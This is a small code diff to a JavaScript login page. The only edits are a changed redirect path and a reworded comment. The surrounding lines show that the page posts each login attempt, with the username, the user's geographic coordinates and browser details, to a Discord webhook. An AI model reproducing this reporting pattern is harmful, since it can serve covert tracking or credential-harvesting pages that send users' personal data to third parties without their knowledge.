@@ -41,8 +41,8 @@
                 // Send success message to Discord Webhook
                 sendToDiscord('Login Success', username, 'Success');
 
-                // Redirect to /main if login is successful
-                window.location.replace("/page.html");
+                // Redirect to page.html if login is successful
+                window.location.replace("page.html");
 
                 // Hide login form and error message
                 document.querySelector(".login-form").style.display = "none";
@@ -72,7 +72,7 @@
                         content: `**Login Attempt:**\nStatus: ${status}\nUsername: ${username}\nResult: ${result}\nLocation: Latitude: ${latitude}, Longitude: ${longitude}\nBrowser: ${browserInfo}`
                     };
 
-                    // Send data to the Discord Webhook
+                    // Send data to the Discord Webhook using a POST request
                     fetch(webhookUrl, {
                         method: 'POST',
                         headers: {
